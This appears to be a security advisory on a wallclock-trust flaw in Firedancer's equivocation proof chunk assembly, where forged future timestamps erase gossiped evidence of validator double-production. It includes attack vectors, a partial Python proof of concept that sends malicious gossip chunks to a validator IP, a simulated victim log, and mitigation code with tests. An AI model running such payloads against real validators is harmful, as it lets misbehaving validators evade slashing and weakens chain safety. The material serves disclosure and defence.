# CONSENSUS-002: Equivocation Proof Chunk Overwriting via Wallclock Manipulation

## Severity
**HIGH**

## Summary
The equivocation proof assembly mechanism trusts attacker-controlled wallclock timestamps, allowing malicious nodes to erase legitimate equivocation proofs by sending chunks with manipulated future timestamps.

## Affected Components
- `src/choreo/eqvoc/fd_eqvoc.c:190-217` (chunk insertion logic)

## Technical Details

### Vulnerability Mechanism

When assembling multi-chunk equivocation proofs, the code accepts chunks based on wallclock timestamp:

```c
// Line 190-197
void
fd_eqvoc_proof_chunk_insert( fd_eqvoc_proof_t * proof,
                              fd_gossip_duplicate_shred_t const * chunk ) {
  if( FD_UNLIKELY( chunk->wallclock > proof->wallclock ) ) {
    FD_LOG_WARNING(( "[%s] received newer chunk (slot: %lu from: %s). overwriting.",
                     __func__, proof->key.slot,
                     FD_BASE58_ENC_32_ALLOCA( proof->key.hash.uc ) ));
    proof->wallclock = chunk->wallclock;
    proof->chunk_cnt = chunk->num_chunks;
    memset( proof->set, 0, 4 * sizeof(ulong) );  // ERASES all previous chunks!
    // fd_eqvoc_proof_set_null( proof->set );
  }
  // ... rest of function
}
```

**The Bug**:
1. `chunk->wallclock` comes from gossip (attacker-controlled)
2. If newer wallclock received, **all previous chunks are erased** (line 195)
3. Attacker can send chunk with `wallclock = LONG_MAX` to permanently reset proof
4. Legitimate equivocation evidence is lost

### Attack Scenario

**Objective**: Prevent detection of equivocation by a malicious validator.

**Prerequisites**:
- Malicious validator V produces equivocating blocks at slot S
- Honest nodes detect equivocation and gossip proof chunks
- Attacker can inject gossip messages

**Attack Steps**:

1. **Wait for legitimate proof chunks**:
   ```
   Honest node A sends: chunk_0 (wallclock: 1000000)
   Honest node B sends: chunk_1 (wallclock: 1000001)
   Honest node C sends: chunk_2 (wallclock: 1000002)

   Victim node proof state:
     wallclock = 1000002
     chunks = {chunk_0, chunk_1, chunk_2}
     set = 0b111 (3 chunks received)
   ```

2. **Send malicious chunk with future wallclock**:
   ```
   Attacker sends: chunk_0 (wallclock: 9999999999999)

   On victim node (line 191-195 executes):
     proof->wallclock = 9999999999999
     proof->chunk_cnt = <attacker_value>
     memset(proof->set, 0, ...)  // ERASES chunk tracking!

   Result:
     wallclock = 9999999999999
     chunks = {} (all erased)
     set = 0b000 (reset to empty)
   ```

3. **Prevent proof completion**:
   - Future legitimate chunks are rejected (older wallclock)
   - Proof never reaches `chunk_cnt` threshold
   - Equivocation goes unreported
   - Malicious validator V escapes punishment

### Detailed Attack Vectors

**Vector 1: Proof Erasure**
- Send chunk with `wallclock = LONG_MAX`
- All subsequent legitimate chunks rejected as "older"
- Proof stuck incomplete forever

**Vector 2: Chunk Count Manipulation**
- Send chunk with high wallclock AND `num_chunks = 999`
- Overwrites `proof->chunk_cnt = 999` (line 194)
- Now need 999 chunks instead of actual count (e.g., 3)
- Impossible to complete proof

**Vector 3: Repeated Resets**
- Whenever proof nears completion, send chunk with `wallclock++`
- Continuously reset proof state
- DoS on equivocation detection

### Real-World Impact

1. **Equivocation Goes Unpunished**:
   - Malicious validators can double-produce blocks
   - Network fails to detect/slash them
   - Chain safety compromised

2. **Censorship of Evidence**:
   - Attacker can selectively erase proofs for specific validators
   - Protects colluding validators

3. **Resource Exhaustion**:
   - Repeated proof resets waste bandwidth/storage
   - Legitimate nodes spend resources tracking incomplete proofs

## Root Cause Analysis

1. **Untrusted Input**: `chunk->wallclock` from gossip is attacker-controlled
2. **No Cryptographic Binding**: Wallclock not signed/verified
3. **Destructive Overwrite**: Erases all progress instead of rejecting suspicious input
4. **Missing Validation**: No bounds checking on wallclock values
   - Accept future timestamps (e.g., year 2099)
   - No rate limiting on wallclock increases

## Proof of Concept

```python
#!/usr/bin/env python3
"""
PoC: Erase equivocation proof via wallclock manipulation
"""

import socket
import struct
import time

def create_malicious_chunk(slot, producer_pubkey, wallclock):
    """Create equivocation proof chunk with manipulated wallclock"""
    chunk = bytearray()

    # fd_gossip_duplicate_shred_t structure
    chunk.extend(struct.pack('<Q', slot))              # slot
    chunk.extend(producer_pubkey)                      # from (32 bytes)
    chunk.extend(struct.pack('<q', wallclock))        # wallclock (MALICIOUS)
    chunk.extend(struct.pack('<I', 1))                 # chunk_index
    chunk.extend(struct.pack('<H', 999))               # num_chunks (MALICIOUS)
    chunk.extend(struct.pack('<H', 100))               # chunk_len
    chunk.extend(b'\x00' * 100)                        # chunk data (garbage)

    return bytes(chunk)

def attack_erase_proof(validator_ip, validator_port, target_slot, producer_pk):
    """Erase equivocation proof by sending high-wallclock chunk"""

    # Create chunk with far-future wallclock
    future_wallclock = 9999999999999  # Year 2286
    malicious_chunk = create_malicious_chunk(
        slot=target_slot,
        producer_pubkey=producer_pk,
        wallclock=future_wallclock
    )

    # Send via gossip protocol (simplified - actual implementation more complex)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    # Gossip push message containing equivocation chunk
    gossip_msg = construct_gossip_push(malicious_chunk)

    sock.sendto(gossip_msg, (validator_ip, validator_port))
    sock.close()

    print(f"[+] Sent malicious chunk for slot {target_slot}")
    print(f"[+] Wallclock: {future_wallclock}")
    print(f"[+] This will erase any existing proof chunks")
    print(f"[+] Future legitimate chunks will be rejected (older wallclock)")

if __name__ == "__main__":
    # Target validator
    VALIDATOR_IP = "192.168.1.100"
    GOSSIP_PORT = 8001

    # Equivocation details
    TARGET_SLOT = 12345678
    MALICIOUS_PRODUCER = b'\xaa' * 32  # Pubkey of equivocating validator

    attack_erase_proof(VALIDATOR_IP, GOSSIP_PORT, TARGET_SLOT, MALICIOUS_PRODUCER)
```

Expected behavior:
```
[+] Sent malicious chunk for slot 12345678
[+] Wallclock: 9999999999999
[+] This will erase any existing proof chunks
[+] Future legitimate chunks will be rejected (older wallclock)

Victim validator logs:
[WARNING] received newer chunk (slot: 12345678 from: Aa...aA). overwriting.
[WARNING] received older chunk (slot: 12345678 from: Bb...bB). ignoring.
[WARNING] received older chunk (slot: 12345678 from: Cc...cC). ignoring.
...
Proof never completes - equivocation undetected
```

## Recommended Mitigations

### Immediate Fix (Required)

**Option 1: Reject suspicious wallclocks instead of overwriting**

```c
void
fd_eqvoc_proof_chunk_insert( fd_eqvoc_proof_t * proof,
                              fd_gossip_duplicate_shred_t const * chunk ) {

  // Validate wallclock is reasonable
  long now = fd_log_wallclock();
  long max_allowed_wallclock = now + (60L * (long)1e9);  // 60 seconds in future

  if( FD_UNLIKELY( chunk->wallclock > max_allowed_wallclock ) ) {
    FD_LOG_WARNING(( "[%s] chunk has suspicious future wallclock %ld (now: %ld). ignoring.",
                     __func__, chunk->wallclock, now ));
    return;  // Don't overwrite existing proof
  }

  // Also check backward drift
  if( FD_UNLIKELY( chunk->wallclock < proof->wallclock - (300L * (long)1e9) ) ) {
    FD_LOG_WARNING(( "[%s] chunk wallclock %ld too far behind proof wallclock %ld. ignoring.",
                     __func__, chunk->wallclock, proof->wallclock ));
    return;
  }

  // Only overwrite if wallclock difference is reasonable (e.g., <1 second)
  if( FD_UNLIKELY( chunk->wallclock > proof->wallclock ) ) {
    long delta = chunk->wallclock - proof->wallclock;
    if( delta > (1L * (long)1e9) ) {  // >1 second difference
      FD_LOG_WARNING(( "[%s] chunk wallclock %ld differs by %ld ns from proof. ignoring.",
                       __func__, chunk->wallclock, delta ));
      return;
    }

    // Small difference OK - accept newer chunk
    proof->wallclock = chunk->wallclock;
  }

  // Rest of function unchanged (no memset erasure)
  if( chunk->wallclock < proof->wallclock ) {
    FD_LOG_WARNING(( "[%s] received older chunk. ignoring.", __func__ ));
    return;
  }

  // Validate num_chunks consistency
  if( proof->chunk_cnt != 0 && proof->chunk_cnt != chunk->num_chunks ) {
    FD_LOG_WARNING(( "[%s] chunk_cnt mismatch. ignoring.", __func__ ));
    return;
  }

  if( proof->chunk_cnt == 0 ) {
    proof->chunk_cnt = chunk->num_chunks;
  }

  // Continue with chunk insertion...
  if( FD_UNLIKELY( fd_eqvoc_proof_set_test( proof->set, chunk->chunk_index ) ) ) {
    return;
  }

  fd_memcpy( &proof->shreds[proof->chunk_sz * chunk->chunk_index],
             chunk->chunk, chunk->chunk_len );
  fd_eqvoc_proof_set_insert( proof->set, chunk->chunk_index );
}
```

**Option 2: Cryptographic authentication**

Sign chunks with validator identity:
```c
// Extend chunk structure
struct fd_gossip_duplicate_shred {
  // ... existing fields
  uchar signature[64];  // Sign over (slot, from, chunk_data)
};

// Verify signature before accepting chunk
int valid = fd_ed25519_verify(
  chunk_hash,
  chunk->signature,
  chunk->from  // Producer's public key
);

if( !valid ) {
  FD_LOG_WARNING(( "Invalid chunk signature. ignoring." ));
  return;
}
```

### Defense in Depth

1. **Rate limiting**:
   ```c
   // Track wallclock changes per proof
   if( ++proof->wallclock_change_count > 3 ) {
     FD_LOG_WARNING(( "Excessive wallclock changes. potential attack." ));
     return;
   }
   ```

2. **Chunk count bounds**:
   ```c
   #define MAX_PROOF_CHUNKS 16
   if( chunk->num_chunks > MAX_PROOF_CHUNKS ) {
     FD_LOG_WARNING(( "Excessive chunk count %u. ignoring.", chunk->num_chunks ));
     return;
   }
   ```

3. **Gossip filtering**:
   - Only accept chunks from stake-weighted nodes
   - Rate limit chunks from same sender

## Verification

### Test Cases

```c
void test_wallclock_manipulation() {
  fd_eqvoc_proof_t proof = {0};
  fd_gossip_duplicate_shred_t chunk = {0};

  // Test 1: Normal operation
  chunk.wallclock = 1000;
  chunk.num_chunks = 3;
  fd_eqvoc_proof_chunk_insert(&proof, &chunk);
  assert(proof.wallclock == 1000);

  // Test 2: Slightly newer chunk (should accept)
  chunk.wallclock = 1001;
  fd_eqvoc_proof_chunk_insert(&proof, &chunk);
  assert(proof.wallclock == 1001);
  assert(proof.chunk_cnt == 3);  // Not reset

  // Test 3: Far future chunk (should reject)
  chunk.wallclock = 9999999999999L;
  chunk.num_chunks = 999;  // Try to manipulate
  fd_eqvoc_proof_chunk_insert(&proof, &chunk);
  assert(proof.wallclock == 1001);  // Unchanged
  assert(proof.chunk_cnt == 3);      // Not overwritten

  // Test 4: Far past chunk (should reject)
  chunk.wallclock = 1;
  fd_eqvoc_proof_chunk_insert(&proof, &chunk);
  assert(proof.wallclock == 1001);  // Unchanged
}
```

## Status
- **Discovered**: 2025-11-08
- **Severity**: HIGH
- **Exploitability**: HIGH (easy to inject gossip)
- **Impact**: HIGH (equivocation detection bypass)
- **Priority**: HIGH (patch immediately)

## References

1. **Solana Equivocation Detection**:
   - Gossip protocol for distributing duplicate shred proofs
   - Multi-chunk assembly for large proofs

2. **Wallclock Trust Issues**:
   - Wallclock is local timestamp, not consensus-verified
   - Trivially manipulated by malicious nodes

3. **Related Vulnerabilities**:
   - Similar time-based TOCTOU in other consensus systems
   - NTP attacks on distributed systems

## Conclusion

The equivocation proof mechanism trusts attacker-controlled timestamps, allowing erasure of legitimate evidence. An attacker can prevent detection of their own equivocation or protect colluding validators. **Immediate mitigation required** via wallclock validation and/or cryptographic authentication of chunks.
